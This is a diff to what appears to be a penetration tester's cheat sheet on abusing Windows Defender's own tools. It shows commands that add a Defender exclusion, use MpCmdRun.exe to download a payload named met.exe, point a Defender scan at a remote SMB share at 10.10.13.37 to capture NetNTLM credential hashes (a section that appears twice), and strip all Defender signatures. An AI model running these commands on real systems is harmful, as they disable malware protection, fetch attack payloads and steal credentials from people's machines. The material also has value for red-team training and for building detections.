@@ -117,3 +117,19 @@ Set-MpPreference -ExclusionExtension "<extension|ps1>"
 ```powershell
 C:\Program Files\Windows Defender\MpCmdRun.exe -DownloadFile -Url http://127.0.0.1/met.exe -Path C:\Users\snovvcrash\music\met.exe
 ```
+
+## Defender - steal net-tnlm
+```powershell
+C:\Program Files\Windows Defender\MpCmdRun.exe -Scan -ScanType 3 -File '\\10.10.13.37\share\file'
+```
+
+
+## Defender - steal net-tnlm
+```powershell
+C:\Program Files\Windows Defender\MpCmdRun.exe -Scan -ScanType 3 -File '\\10.10.13.37\share\file'
+```
+
+## Defender - remove signatures
+```powershell
+C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.9-0\MpCmdRun.exe -RemoveDefinitions -All
+```
